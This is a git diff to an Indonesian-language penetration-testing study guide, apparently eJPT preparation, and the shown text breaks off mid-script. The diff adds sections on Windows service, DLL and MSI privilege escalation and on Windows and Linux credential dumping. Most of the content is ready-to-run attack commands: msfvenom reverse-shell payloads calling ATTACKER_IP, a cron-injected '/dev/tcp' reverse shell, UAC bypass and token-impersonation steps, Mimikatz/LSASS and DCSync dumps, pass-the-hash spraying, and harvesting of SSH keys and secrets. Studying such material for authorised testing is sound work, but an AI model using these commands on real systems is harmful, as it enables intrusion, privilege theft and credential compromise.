@@ -25,10 +25,13 @@
 6. [Privilege Escalation](#6-privilege-escalation)
    - [Windows PrivEsc](#61-windows-privilege-escalation)
    - [Linux PrivEsc](#62-linux-privilege-escalation)
-7. [Post-Exploitation](#7-post-exploitation)
-8. [AV Evasion](#8-av-evasion)
-9. [Vulnerability Scanning](#9-vulnerability-scanning)
-10. [Cheat Sheet & Quick Reference](#10-cheat-sheet--quick-reference)
+7. [Windows File System Vulnerabilities](#7-windows-file-system-vulnerabilities)
+8. [Windows Credential Dumping](#8-windows-credential-dumping)
+9. [Linux Credential Dumping](#9-linux-credential-dumping)
+10. [Post-Exploitation](#10-post-exploitation)
+11. [AV Evasion](#11-av-evasion)
+12. [Vulnerability Scanning](#12-vulnerability-scanning)
+13. [Cheat Sheet & Quick Reference](#13-cheat-sheet--quick-reference)
 
 ---
 
@@ -798,53 +801,27 @@ hashcat -m 1000 hash.txt -a 3 ?a?a?a?a?a?a?a?a
 hashcat -m 1000 hash.txt -a 1 wordlist1.txt wordlist2.txt
 ```
 
-### Mendapatkan Hash
-
-```bash
-# ─── WINDOWS ───────────────────────────────────────────────
-
-# Dari Meterpreter (butuh SYSTEM)
-meterpreter> hashdump
-meterpreter> run post/windows/gather/hashdump
-meterpreter> run post/windows/gather/credentials/credential_collector
-
-# Mimikatz via Metasploit
-meterpreter> load kiwi
-meterpreter> creds_all
-meterpreter> lsa_dump_sam
-meterpreter> lsa_dump_secrets
-
-# ─── LINUX ─────────────────────────────────────────────────
-
-# Jika root, dump langsung
-cat /etc/shadow
-cat /etc/passwd
-
-# Unshadow untuk john
-unshadow /etc/passwd /etc/shadow > hashes.txt
-```
-
 ---
 
 ## 6. Privilege Escalation
 
 ### 6.1 Windows Privilege Escalation
 
-## Konsep Dasar
- 
+#### Konsep Dasar
+
 **Privilege Escalation** = naik dari user biasa → Administrator / SYSTEM.
- 
-### Integrity Level di Windows
- 
+
+#### Integrity Level di Windows
+
 | Level | Keterangan | Contoh |
 |---|---|---|
 | Low | Sangat terbatas | Sandbox, browser |
 | Medium | User biasa | Shell awal setelah exploit |
 | High | Administrator aktif | Setelah UAC bypass |
 | SYSTEM | Tertinggi | `NT AUTHORITY\SYSTEM` |
- 
-### Alur Umum
- 
+
+#### Alur Umum
+
 ```
 Dapat shell (Medium)
       ↓
@@ -854,86 +831,74 @@ Eksploitasi teknik PrivEsc
       ↓
 NT AUTHORITY\SYSTEM
 ```
- 
----
- 
-**1. Windows Kernel Exploits**
 
-**Konsep**
- 
-Memanfaatkan **kerentanan di kernel Windows** yang belum di-patch. Cocok untuk sistem lama yang jarang diupdate.
- 
-**Langkah**
- 
+---
+
+#### 1. Windows Kernel Exploits
+
+**Konsep**: Memanfaatkan **kerentanan di kernel Windows** yang belum di-patch. Cocok untuk sistem lama yang jarang diupdate.
+
 ```bash
 # 1. Cek versi OS di Meterpreter
 meterpreter > sysinfo
- 
+
 # 2. Cari exploit yang cocok dengan versi OS
 meterpreter > run post/multi/recon/local_exploit_suggester
- 
+
 # 3. Catat exploit yang disarankan, lalu background sesi
 meterpreter > background
- 
+
 # 4. Load dan jalankan exploit
 msf > use <nama_exploit>
 msf > set SESSION <nomor_sesi>
 msf > run
- 
+
 # 5. Verifikasi
 meterpreter > getuid
 # NT AUTHORITY\SYSTEM
 ```
- 
-### Tools Tambahan (manual)
- 
+
+**Tools Tambahan (manual)**
+
 ```bash
 # Upload Windows Exploit Suggester ke target
-# Di Kali:
 python windows-exploit-suggester.py --update
 python windows-exploit-suggester.py --database <file.xlsx> --systeminfo <systeminfo.txt>
 ```
- 
-### Contoh Exploit Umum
- 
+
+**Contoh Exploit Umum**
+
 | Exploit | Target OS |
 |---|---|
 | MS17-010 (EternalBlue) | Windows 7 / 2008 R2 |
 | MS16-032 | Windows 7–10 / 2008–2012 |
 | MS15-051 | Windows 7 / 2008 |
- 
-### Tips
- 
-- Selalu jalankan `local_exploit_suggester` dulu sebelum coba manual
-- Kernel exploit bisa crash sistem — gunakan sebagai opsi terakhir
-- Pastikan arsitektur exploit match dengan OS (x86/x64)
+
+> **Tips**: Selalu jalankan `local_exploit_suggester` dulu. Kernel exploit bisa crash sistem — gunakan sebagai opsi terakhir. Pastikan arsitektur exploit match dengan OS (x86/x64).
+
 ---
- 
-## 2. Bypassing UAC with UACMe
- 
-### Konsep
- 
-**UAC (User Account Control)** = mekanisme Windows yang meminta konfirmasi sebelum menjalankan aksi privilege tinggi.
- 
-**UACMe** = tool berisi 40+ teknik bypass UAC, masing-masing memanfaatkan celah Windows yang berbeda.
- 
+
+#### 2. Bypassing UAC dengan UACMe
+
+**Konsep**: **UAC (User Account Control)** adalah mekanisme Windows yang meminta konfirmasi sebelum menjalankan aksi privilege tinggi. **UACMe** berisi 40+ teknik bypass UAC, masing-masing memanfaatkan celah Windows yang berbeda.
+
 > Meskipun username "admin", tanpa bypass UAC kamu masih di Medium Integrity — banyak aksi yang tidak bisa dilakukan.
- 
-### Persiapan Sebelum UAC Bypass
- 
+
+**Persiapan Sebelum UAC Bypass**
+
 ```bash
 # 1. Pastikan sudah migrate ke explorer.exe (x64)
 meterpreter > pgrep explorer
 meterpreter > migrate <PID>
- 
+
 # 2. Verifikasi sudah x64
 meterpreter > sysinfo
 # Meterpreter: x64/windows ✓
- 
+
 # 3. Generate payload x64 di Kali
 msfvenom -p windows/x64/meterpreter/reverse_tcp \
   LHOST=<IP_KALI> LPORT=4444 -f exe -o backdoor.exe
- 
+
 # 4. Siapkan listener
 msf > use multi/handler
 msf > set payload windows/x64/meterpreter/reverse_tcp
@@ -941,119 +906,99 @@ msf > set LHOST <IP_KALI>
 msf > set LPORT 4444
 msf > run
 ```
- 
-### Eksekusi UACMe
- 
+
+**Eksekusi UACMe**
+
 ```bash
 # 5. Upload Akagi64.exe dan backdoor.exe ke target
 meterpreter > upload Akagi64.exe C:\\Users\\admin\\AppData\\Local\\Temp
 meterpreter > upload backdoor.exe C:\\Users\\admin\\AppData\\Local\\Temp
- 
+
 # 6. Jalankan UACMe
 meterpreter > shell
 C:\> C:\Users\admin\AppData\Local\Temp\Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
- 
+
 # 7. Sesi baru masuk di listener → migrate ke lsass
 meterpreter > migrate <PID_lsass>
- 
+
 # 8. Verifikasi
 meterpreter > getuid
 # NT AUTHORITY\SYSTEM ✓
 ```
- 
-### Pilih Nomor Metode UACMe
- 
+
+**Pilih Nomor Metode UACMe**
+
 | Nomor | Teknik | Target OS |
 |---|---|---|
 | 23 | `eventvwr.exe` | Win 7 / 2008 / 2012 ← paling sering di eJPT |
 | 30 | `fodhelper.exe` | Windows 10 |
 | 33 | `diskcleanup` scheduled task | Windows 10 |
 | 41 | `schtasks` COM hijack | Windows 10 baru |
- 
-### Kenapa Harus Migrate ke explorer.exe Dulu?
- 
-- Shell awal biasanya x86 (proses yang di-exploit 32-bit)
-- `explorer.exe` adalah proses x64 dengan token sesi interaktif user
-- Tanpa migrate → payload x64 tidak bisa dijalankan, UAC bypass gagal
+
 ---
- 
-## 3. Access Token Impersonation
- 
-### Konsep
- 
-**Access Token** = "kartu identitas" proses di Windows. Berisi info: siapa user-nya, privilege apa yang dimiliki, integrity level berapa.
- 
-**Impersonation** = "mencuri" token milik proses lain yang privilege-nya lebih tinggi — misalnya token milik SYSTEM — dan menggunakannya untuk diri sendiri.
- 
-### Privilege yang Dibutuhkan
- 
-Teknik ini membutuhkan salah satu dari:
- 
+
+#### 3. Access Token Impersonation
+
+**Konsep**: **Access Token** adalah "kartu identitas" proses di Windows. **Impersonation** berarti "mencuri" token milik proses yang privilege-nya lebih tinggi — misalnya token milik SYSTEM.
+
+**Privilege yang Dibutuhkan**
+
 | Privilege | Keterangan |
 |---|---|
 | `SeImpersonatePrivilege` | Boleh impersonate token user lain |
 | `SeAssignPrimaryTokenPrivilege` | Boleh assign token ke proses |
- 
+
 ```bash
 # Cek privilege yang tersedia
 meterpreter > getprivs
 # atau di shell:
 C:\> whoami /priv
 ```
- 
-### Teknik: Potato Attacks
- 
-Jika `SeImpersonatePrivilege` tersedia, gunakan **Potato exploit**:
- 
+
+**Teknik: Potato Attacks** (jika `SeImpersonatePrivilege` tersedia)
+
 | Tool | Target OS |
 |---|---|
 | `JuicyPotato` | Windows 7–10 / 2008–2016 |
 | `PrintSpoofer` | Windows 10 / 2019 |
 | `RoguePotato` | Windows 10 / 2019 |
- 
-### Eksekusi via Metasploit (Incognito)
- 
+
+**Eksekusi via Metasploit (Incognito)**
+
 ```bash
 # 1. Load modul incognito
 meterpreter > load incognito
- 
+
 # 2. List token yang tersedia
 meterpreter > list_tokens -u
- 
+
 # 3. Impersonate token SYSTEM atau Administrator
 meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
- 
+
 # 4. Verifikasi
 meterpreter > getuid
 # NT AUTHORITY\SYSTEM ✓
- 
+
 # 5. Kalau getuid berhasil tapi privilege masih terbatas
 meterpreter > getsystem
 ```
- 
-### Eksekusi Manual (JuicyPotato)
- 
+
+**Eksekusi Manual (JuicyPotato)**
+
 ```bash
 # 1. Upload JuicyPotato.exe dan backdoor.exe ke target
 meterpreter > upload JuicyPotato.exe C:\\Temp
 meterpreter > upload backdoor.exe C:\\Temp
- 
+
 # 2. Jalankan
 C:\Temp> JuicyPotato.exe -l 4445 -p backdoor.exe -t * -c <CLSID>
- 
+
 # CLSID berbeda tiap versi Windows
 # Referensi: https://github.com/ohpe/juicy-potato/tree/master/CLSID
 ```
- 
-### Tips
- 
-- Cek `SeImpersonatePrivilege` dulu — kalau tidak ada, teknik ini tidak akan jalan
-- Service account (IIS, SQL Server) hampir selalu punya `SeImpersonatePrivilege`
-- Kalau `impersonate_token` berhasil tapi proses tidak stabil, migrate ke proses SYSTEM yang stabil seperti `services.exe`
----
- 
-## Ringkasan Alur Pemilihan Teknik
- 
+
+#### Ringkasan Alur Pemilihan Teknik
+
 ```
 Dapat shell di Windows
         ↓
@@ -1068,38 +1013,8 @@ Jalankan: local_exploit_suggester + whoami /priv
         └── SeImpersonatePrivilege tersedia?
               └── Token Impersonation (Incognito / JuicyPotato)
 ```
- 
----
- 
-## Command Penting — Quick Reference
- 
-```bash
-# Enumeration
-sysinfo                          # info OS dan arsitektur
-getuid                           # cek user saat ini
-getprivs                         # cek privilege
-run post/multi/recon/local_exploit_suggester  # cari exploit otomatis
- 
-# Migration
-pgrep explorer                   # cari PID explorer
-migrate <PID>                    # pindah ke proses lain
- 
-# UAC Bypass
-Akagi64.exe 23 <path_payload>    # jalankan UACMe metode 23
- 
-# Token Impersonation
-load incognito                   # load modul
-list_tokens -u                   # list token tersedia
-impersonate_token "NT AUTHORITY\\SYSTEM"  # impersonate token
- 
-# Eskalasi ke SYSTEM
-getsystem                        # otomatis coba berbagai teknik
-migrate <PID_lsass>              # migrate ke lsass.exe
-```
- 
---- 
 
-#### Enumerasi Manual
+#### Enumerasi Manual Windows
 
 ```cmd
 # Info sistem
@@ -1133,6 +1048,8 @@ route print
 netsh firewall show state
 netsh advfirewall show allprofiles
 ```
+
+---
 
 ### 6.2 Linux Privilege Escalation
 
@@ -1193,16 +1110,9 @@ sudo -l
 # (ALL) NOPASSWD: /usr/bin/vim
 
 # Eksploitasi - GTFOBins adalah referensi utama
-# sudo python3
 sudo python3 -c 'import os; os.execl("/bin/sh", "sh")'
-
-# sudo find
 sudo find . -exec /bin/sh \; -quit
-
-# sudo vim
 sudo vim -c ':!/bin/sh'
-
-# sudo awk
 sudo awk 'BEGIN {system("/bin/sh")}'
 ```
 
@@ -1213,13 +1123,8 @@ sudo awk 'BEGIN {system("/bin/sh")}'
 find / -perm -4000 -type f 2>/dev/null
 
 # Eksploitasi dengan GTFOBins
-# Contoh: /usr/bin/find dengan SUID
 /usr/bin/find . -exec /bin/sh -p \; -quit
-
-# Contoh: /usr/bin/python dengan SUID
 /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
-
-# Contoh: /bin/bash dengan SUID
 /bin/bash -p    # -p preserves SUID
 ```
 
@@ -1229,10 +1134,8 @@ find / -perm -4000 -type f 2>/dev/null
 # Cek jika /etc/passwd bisa ditulis
 ls -la /etc/passwd
 
-# Jika writable, tambahkan user root baru
 # Generate password hash
 openssl passwd -1 -salt salt newpassword
-# Atau: python3 -c "import crypt; print(crypt.crypt('newpass', '\$1\$salt\$'))"
 
 # Tambahkan line ke /etc/passwd
 echo 'hacker:$1$salt$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
@@ -1248,9 +1151,6 @@ su hacker
 cat /etc/crontab
 
 # Jika ada script yang dijalankan root dan bisa kita tulis
-ls -la /path/to/cron/script.sh
-
-# Jika writable, tambahkan reverse shell atau privilege escalation
 echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /path/to/cron/script.sh
 
 # Atau buat user baru
@@ -1292,7 +1192,664 @@ meterpreter> run post/multi/recon/local_exploit_suggester
 
 ---
 
-## 7. Post-Exploitation
+## 7. Windows File System Vulnerabilities
+
+### Konsep Dasar
+
+**Windows File System Vulnerabilities** mencakup eksploitasi izin file/direktori yang salah konfigurasi, DLL hijacking, service binary exploitation, dan unquoted service path — semuanya bertujuan mengeksekusi kode berbahaya dengan hak privilege lebih tinggi.
+
+### 7.1 Weak Service Permissions
+
+Jika service berjalan sebagai SYSTEM namun binary-nya bisa ditulis oleh user biasa, kita bisa mengganti binary tersebut dengan payload kita.
+
+```bash
+# Cek permissions service binary
+icacls "C:\Path\To\service.exe"
+
+# Atau menggunakan accesschk (Sysinternals)
+accesschk.exe -wuvc "Everyone" *
+accesschk.exe -wuvc "Users" *
+accesschk.exe -uwcqv "Authenticated Users" *
+
+# Metasploit - Cek service permissions
+use post/multi/recon/local_exploit_suggester
+# atau
+use exploit/windows/local/service_permissions
+
+# Manual - List services dan binary path
+wmic service get name,startname,pathname
+sc qc <service_name>
+```
+
+**Eksploitasi**
+
+```bash
+# 1. Generate payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=ATTACKER_IP LPORT=4444 -f exe -o malicious.exe
+
+# 2. Upload dan timpa binary service
+meterpreter > upload malicious.exe "C:\\Path\\To\\service.exe"
+
+# 3. Restart service
+meterpreter > shell
+C:\> sc stop <service_name>
+C:\> sc start <service_name>
+
+# 4. Tangkap sesi di listener
+```
+
+---
+
+### 7.2 Unquoted Service Path
+
+Jika path service binary mengandung spasi dan tidak dikutip, Windows akan mencoba mengeksekusi binary di setiap segmen path.
+
+```
+Path: C:\Program Files\My App\service.exe
+
+Windows mencoba:
+  1. C:\Program.exe
+  2. C:\Program Files\My.exe     ← bisa dieksploitasi!
+  3. C:\Program Files\My App\service.exe
+```
+
+```bash
+# Temukan unquoted service path
+wmic service get name,startname,pathname | findstr /i /v "C:\\Windows\\"
+# atau
+sc qc <service_name>
+
+# Metasploit
+use exploit/windows/local/unquoted_service_path
+set SESSION <session_id>
+run
+
+# Manual check dengan PowerShell
+Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.PathName -notlike '"*"'}
+```
+
+**Eksploitasi**
+
+```bash
+# 1. Identifikasi lokasi yang bisa ditulis
+icacls "C:\Program Files\My App\"
+
+# 2. Generate dan upload payload ke lokasi yang tepat
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=ATTACKER_IP LPORT=4444 -f exe -o My.exe
+
+meterpreter > upload My.exe "C:\\Program Files\\My.exe"
+
+# 3. Restart service atau tunggu reboot
+C:\> sc stop <service_name> && sc start <service_name>
+```
+
+---
+
+### 7.3 DLL Hijacking
+
+Windows mencari DLL di berbagai lokasi secara berurutan. Jika lokasi tersebut bisa ditulis oleh user biasa, kita bisa menanamkan DLL berbahaya.
+
+**Urutan Pencarian DLL Windows (Default)**:
+1. Direktori aplikasi
+2. `C:\Windows\System32`
+3. `C:\Windows\System`
+4. `C:\Windows`
+5. Current working directory
+6. Direktori dalam PATH
+
+```bash
+# Temukan DLL yang hilang dengan Process Monitor (Sysinternals)
+# Filter: Result = "NAME NOT FOUND", Path ends with ".dll"
+
+# Atau gunakan PowerSploit
+Find-PathDLLHijack
+Find-ProcessDLLHijack
+
+# Metasploit
+use post/windows/manage/reflective_dll_inject
+```
+
+**Membuat DLL Berbahaya**
+
+```bash
+# Generate DLL payload dengan msfvenom
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=ATTACKER_IP LPORT=4444 \
+  -f dll -o hijack.dll
+
+# Upload dengan nama DLL yang ditargetkan
+meterpreter > upload hijack.dll "C:\\Target\\Path\\missing.dll"
+
+# Restart service/aplikasi yang memuat DLL tersebut
+```
+
+---
+
+### 7.4 AlwaysInstallElevated
+
+Jika registry key `AlwaysInstallElevated` diset ke 1 di HKLM dan HKCU, semua paket `.msi` akan dijalankan dengan hak SYSTEM.
+
+```bash
+# Cek registry keys
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# Jika keduanya = 0x1, sistem rentan
+
+# Generate MSI payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=ATTACKER_IP LPORT=4444 \
+  -f msi -o shell.msi
+
+# Upload dan eksekusi
+meterpreter > upload shell.msi C:\\Temp\\shell.msi
+meterpreter > shell
+C:\> msiexec /quiet /qn /i C:\Temp\shell.msi
+
+# Metasploit (otomatis)
+use exploit/windows/local/always_install_elevated
+set SESSION <session_id>
+run
+```
+
+---
+
+### 7.5 Scheduled Tasks Exploitation
+
+```bash
+# List scheduled tasks
+schtasks /query /fo LIST /v
+schtasks /query /fo LIST /v | findstr "Task To Run"
+
+# Cek jika binary task bisa ditulis
+icacls "C:\Path\To\scheduled_task.exe"
+
+# Jika writable, timpa dengan payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=ATTACKER_IP LPORT=4444 -f exe -o task_payload.exe
+
+meterpreter > upload task_payload.exe "C:\\Path\\To\\scheduled_task.exe"
+
+# Tunggu task dijalankan, atau paksa jalankan
+C:\> schtasks /run /tn "TaskName"
+```
+
+---
+
+## 8. Windows Credential Dumping
+
+### Konsep Dasar
+
+**Credential Dumping** adalah teknik mengekstrak kredensial (password, hash, token) dari sistem Windows yang sudah terkompromis. Kredensial tersimpan di berbagai lokasi: SAM database, LSASS memory, registry, dan file konfigurasi.
+
+### Lokasi Penyimpanan Kredensial Windows
+
+| Lokasi | Deskripsi |
+|---|---|
+| `HKLM\SAM` | Local user password hashes (NTLM) |
+| `HKLM\SECURITY` | LSA secrets, cached domain credentials |
+| `HKLM\SYSTEM` | Boot key untuk decrypt SAM |
+| LSASS Process | Plaintext passwords, NTLM hashes, Kerberos tickets |
+| Credential Manager | Browser passwords, network credentials |
+| `%APPDATA%\...\vault\` | Windows Vault credentials |
+
+---
+
+### 8.1 Hashdump via Meterpreter
+
+```bash
+# Butuh SYSTEM privileges
+meterpreter > getsystem
+
+# Dump local SAM hashes
+meterpreter > hashdump
+
+# Output format:
+# username:RID:LM_HASH:NTLM_HASH:::
+# Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+
+# Post module (lebih lengkap)
+meterpreter > run post/windows/gather/hashdump
+meterpreter > run post/windows/gather/smart_hashdump
+```
+
+---
+
+### 8.2 Mimikatz via Kiwi (Metasploit)
+
+Kiwi adalah implementasi Mimikatz dalam Meterpreter yang memungkinkan dump kredensial langsung dari LSASS.
+
+```bash
+# Load kiwi module
+meterpreter > load kiwi
+
+# Dump semua kredensial
+meterpreter > creds_all
+
+# Dump SAM database
+meterpreter > lsa_dump_sam
+
+# Dump LSA secrets (service account passwords, dll)
+meterpreter > lsa_dump_secrets
+
+# Dump plaintext passwords dari LSASS (butuh SYSTEM)
+meterpreter > creds_msv        # MSV credentials (NTLM)
+meterpreter > creds_kerberos   # Kerberos tickets
+meterpreter > creds_wdigest    # WDigest (plaintext jika diaktifkan)
+meterpreter > creds_tspkg      # TS Package
+meterpreter > creds_ssp        # SSP credentials
+
+# Domain credential sync
+meterpreter > dcsync_ntlm DOMAIN\\username
+meterpreter > dcsync_ntlm DOMAIN\\krbtgt   # Golden Ticket material
+```
+
+---
+
+### 8.3 Mimikatz Standalone
+
+Jika ingin menjalankan Mimikatz langsung di target:
+
+```bash
+# Upload Mimikatz ke target
+meterpreter > upload mimikatz.exe C:\\Temp\\mimikatz.exe
+
+# Jalankan shell lalu eksekusi
+meterpreter > shell
+C:\Temp> mimikatz.exe
+
+# Di dalam Mimikatz prompt:
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords    ← dump plaintext + hashes dari LSASS
+mimikatz # sekurlsa::wdigest           ← WDigest plaintext passwords
+mimikatz # lsadump::sam                ← dump SAM database
+mimikatz # lsadump::secrets            ← LSA secrets
+mimikatz # lsadump::cache              ← cached domain credentials
+mimikatz # token::elevate              ← elevate ke SYSTEM token
+mimikatz # vault::cred                 ← Windows Vault
+mimikatz # vault::list                 ← list vault items
+```
+
+---
+
+### 8.4 SAM Database Offline Dump
+
+Jika memiliki akses filesystem (backup, offline recovery):
+
+```bash
+# Metode 1: reg save (butuh admin)
+C:\> reg save HKLM\SAM C:\Temp\sam.hive
+C:\> reg save HKLM\SYSTEM C:\Temp\system.hive
+C:\> reg save HKLM\SECURITY C:\Temp\security.hive
+
+# Download ke Kali
+meterpreter > download C:\\Temp\\sam.hive /tmp/
+meterpreter > download C:\\Temp\\system.hive /tmp/
+meterpreter > download C:\\Temp\\security.hive /tmp/
+
+# Metode 2: Volume Shadow Copy (jika SAM sedang digunakan)
+C:\> vssadmin create shadow /for=C:
+C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\sam.hive
+C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\system.hive
+```
+
+**Extract hashes di Kali**
+
+```bash
+# Impacket secretsdump
+secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL
+
+# Samdump2
+samdump2 system.hive sam.hive
+
+# Output NTLM hash → crack dengan hashcat
+hashcat -m 1000 ntlm_hashes.txt rockyou.txt
+```
+
+---
+
+### 8.5 Pass-the-Hash (PtH)
+
+Setelah mendapatkan NTLM hash, kita bisa menggunakannya untuk autentikasi tanpa perlu crack hash.
+
+```bash
+# Impacket PsExec dengan hash
+psexec.py -hashes :NTLM_HASH administrator@TARGET_IP
+
+# Impacket SMBExec
+smbexec.py -hashes :NTLM_HASH administrator@TARGET_IP
+
+# Impacket WMIExec
+wmiexec.py -hashes :NTLM_HASH administrator@TARGET_IP
+
+# CrackMapExec
+crackmapexec smb TARGET_IP -u administrator -H NTLM_HASH
+crackmapexec smb 192.168.1.0/24 -u administrator -H NTLM_HASH  # spray ke subnet
+
+# Evil-WinRM
+evil-winrm -i TARGET_IP -u administrator -H NTLM_HASH
+
+# Metasploit PsExec
+use exploit/windows/smb/psexec
+set SMBUser administrator
+set SMBPass aad3b435b51404eeaad3b435b51404ee:NTLM_HASH   # format LM:NTLM
+run
+```
+
+---
+
+### 8.6 Credential Manager & Browser Passwords
+
+```bash
+# Metasploit - Credential Collector
+meterpreter > run post/windows/gather/credentials/credential_collector
+
+# Dump Windows Credential Manager
+meterpreter > run post/windows/gather/enum_logged_on_users
+meterpreter > run post/windows/gather/credentials/windows_autologin
+
+# Browser credentials
+meterpreter > run post/windows/gather/credentials/chrome
+meterpreter > run post/windows/gather/credentials/firefox
+
+# Via shell - cmdkey
+C:\> cmdkey /list
+
+# VaultCmd
+C:\> vaultcmd /list
+C:\> vaultcmd /listcreds:"Web Credentials"
+```
+
+---
+
+### 8.7 LSASS Memory Dump
+
+```bash
+# Metode 1: Task Manager (GUI) → klik kanan lsass.exe → Create dump file
+
+# Metode 2: ProcDump (Sysinternals)
+C:\> procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+# Metode 3: comsvcs.dll (Living off the Land)
+C:\> tasklist | findstr lsass          # dapatkan PID lsass
+C:\> rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\Temp\lsass.dmp full
+
+# Download dump ke Kali
+meterpreter > download C:\\Temp\\lsass.dmp /tmp/
+
+# Extract credentials dari dump di Kali
+pypykatz lsa minidump lsass.dmp
+# atau
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords
+```
+
+---
+
+## 9. Linux Credential Dumping
+
+### Konsep Dasar
+
+Di Linux, kredensial tersimpan di berbagai file sistem dan memori proses. Target utama adalah `/etc/shadow`, history file, konfigurasi aplikasi, dan SSH keys.
+
+### Lokasi Kredensial Penting di Linux
+
+| Lokasi | Deskripsi |
+|---|---|
+| `/etc/shadow` | Password hash semua user |
+| `/etc/passwd` | Info user (hash jika shadow tidak aktif) |
+| `~/.ssh/id_rsa` | SSH private key |
+| `~/.bash_history` | Riwayat command (sering berisi password) |
+| `/var/log/auth.log` | Log autentikasi |
+| `~/.gnome2/keyrings/` | GNOME Keyring |
+| `/proc/<PID>/environ` | Environment variables proses |
+| `/etc/mysql/my.cnf` | Kredensial MySQL |
+| `/var/www/html/config.php` | Kredensial aplikasi web |
+
+---
+
+### 9.1 /etc/shadow — Dump dan Crack
+
+```bash
+# Baca shadow (butuh root/sudo)
+cat /etc/shadow
+
+# Format entry shadow:
+# username:$id$salt$hash:lastchg:min:max:warn:inactive:expire:
+# $1$ = MD5
+# $2a$ / $2y$ = bcrypt
+# $5$ = SHA-256
+# $6$ = SHA-512
+
+# Salin ke Kali untuk cracking
+# Di target:
+cat /etc/passwd > /tmp/passwd.txt
+cat /etc/shadow > /tmp/shadow.txt
+
+# Download ke Kali
+scp user@TARGET_IP:/tmp/passwd.txt /tmp/
+scp user@TARGET_IP:/tmp/shadow.txt /tmp/
+
+# Atau via Meterpreter
+meterpreter > download /etc/shadow /tmp/
+meterpreter > download /etc/passwd /tmp/
+
+# Gabungkan dengan unshadow
+unshadow /tmp/passwd.txt /tmp/shadow.txt > /tmp/combined.txt
+
+# Crack dengan John
+john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/combined.txt
+john --show /tmp/combined.txt
+
+# Crack dengan Hashcat
+# SHA-512 ($6$)
+hashcat -m 1800 /tmp/shadow.txt rockyou.txt
+
+# SHA-256 ($5$)
+hashcat -m 7400 /tmp/shadow.txt rockyou.txt
+
+# MD5 ($1$)
+hashcat -m 500 /tmp/shadow.txt rockyou.txt
+```
+
+---
+
+### 9.2 SSH Key Harvesting
+
+```bash
+# Cari semua private key di sistem
+find / -name "id_rsa" 2>/dev/null
+find / -name "*.pem" 2>/dev/null
+find / -name "*.key" 2>/dev/null
+find / -name "authorized_keys" 2>/dev/null
+
+# Lokasi umum SSH keys
+cat ~/.ssh/id_rsa
+cat ~/.ssh/id_ecdsa
+cat ~/.ssh/id_ed25519
+cat /root/.ssh/id_rsa
+ls -la ~/.ssh/
+
+# Cek known_hosts untuk target lateral movement
+cat ~/.ssh/known_hosts
+
+# Download key ke Kali
+meterpreter > download /home/user/.ssh/id_rsa /tmp/
+
+# Gunakan key untuk login
+chmod 600 /tmp/id_rsa
+ssh -i /tmp/id_rsa user@TARGET_IP
+
+# Jika key terenkripsi, crack passphrase
+ssh2john /tmp/id_rsa > /tmp/id_rsa.hash
+john --wordlist=rockyou.txt /tmp/id_rsa.hash
+```
+
+---
+
+### 9.3 Bash History & Environment Variables
+
+```bash
+# Baca bash history semua user
+cat ~/.bash_history
+cat /root/.bash_history
+cat /home/*/.bash_history
+
+# Environment variables (sering berisi API key, password)
+env
+printenv
+cat /proc/self/environ | tr '\0' '\n'
+
+# Cari password dalam history
+grep -i "password\|passwd\|pass\|secret\|key\|token" ~/.bash_history
+grep -i "mysql\|psql\|ftp\|ssh" ~/.bash_history
+
+# Environment variables dari proses yang berjalan
+for pid in $(ls /proc | grep -E '^[0-9]+$'); do
+    cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -i "pass\|secret\|key\|token"
+done
+```
+
+---
+
+### 9.4 Credential dalam File Konfigurasi
+
+```bash
+# Web application configs
+cat /var/www/html/config.php
+cat /var/www/html/wp-config.php          # WordPress
+cat /var/www/html/.env                   # Laravel / Node.js
+find /var/www -name "*.conf" -o -name "config.php" -o -name ".env" 2>/dev/null
+
+# Database configs
+cat /etc/mysql/my.cnf
+cat /etc/mysql/mysql.conf.d/mysqld.cnf
+cat ~/.my.cnf                            # MySQL client credentials
+cat /etc/postgresql/*/main/pg_hba.conf   # PostgreSQL
+
+# FTP configs
+cat /etc/vsftpd.conf
+cat /etc/proftpd/proftpd.conf
+
+# SSH configs
+cat /etc/ssh/sshd_config
+find / -name "*.conf" -exec grep -l "password\|passwd" {} \; 2>/dev/null
+
+# Rekursif cari password dalam file
+grep -rn "password\|passwd\|secret\|api_key" /var/www/html/ 2>/dev/null
+grep -rn "DB_PASS\|DB_PASSWORD\|MYSQL_PASSWORD" /var/www/ 2>/dev/null
+```
+
+---
+
+### 9.5 Memory Credential Dumping
+
+```bash
+# Dump memory proses dengan gcore
+# Temukan PID proses target (misal: sshd, apache)
+pgrep sshd
+
+# Dump memory
+gcore -o /tmp/proc_dump <PID>
+
+# Cari string berisi password dalam dump
+strings /tmp/proc_dump.<PID> | grep -i "password\|passwd"
+
+# Menggunakan /proc filesystem langsung
+cat /proc/<PID>/maps    # memory map
+strings /proc/<PID>/mem 2>/dev/null | grep -i password
+
+# Dump dengan dd (perlu root)
+PID=<target_pid>
+MAPS=$(grep -E "^[0-9a-f]+-[0-9a-f]+ r" /proc/$PID/maps | grep -v "\.so")
+while IFS= read -r line; do
